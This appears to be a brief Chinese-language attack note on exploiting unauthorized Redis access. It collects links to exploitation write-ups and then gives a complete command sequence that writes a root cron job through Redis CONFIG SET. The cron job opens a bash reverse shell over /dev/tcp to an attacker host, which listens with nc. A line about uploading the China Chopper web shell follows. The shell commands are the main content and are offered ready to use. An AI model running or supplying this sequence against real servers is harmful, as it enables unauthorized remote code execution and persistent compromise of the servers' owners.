redis 漏洞利用
https://github.com/antirez/redis/issues/3594
https://webcache.googleusercontent.com/search?q=cache:6c-N8GHMMdIJ:https://www.jianshu.com/p/b8009a6772cf+&cd=6&hl=en&ct=clnk&gl=sg&client=firefox-b-d

redis利用姿势收集 https://phpinfo.me/2016/07/07/1275.html
对一次 redis 未授权写入攻击的分析以及 redis 4.x RCE 学习 https://www.k0rz3n.com/2019/07/29/对一次 redis 未授权写入攻击的分析以及 redis 4.x RCE 学习/
配置漏洞之redis未授权访问 https://uknowsec.cn/posts/skill/配置漏洞之redis未授权访问.html
https://xz.aliyun.com/t/2240

反弹shell
靶机用root启动redis
攻击机
```
apt-get install redis -y
redis-cli -h 192.168.207.3
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
set payload "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.207.4/9999 0>&1\n\n"
Save
Exit
nc -l -p 9999
```
上传中国菜刀


Redis攻击方法总结
https://mp.weixin.qq.com/s/qH14yE_7Iryr4uzYS2nUBw
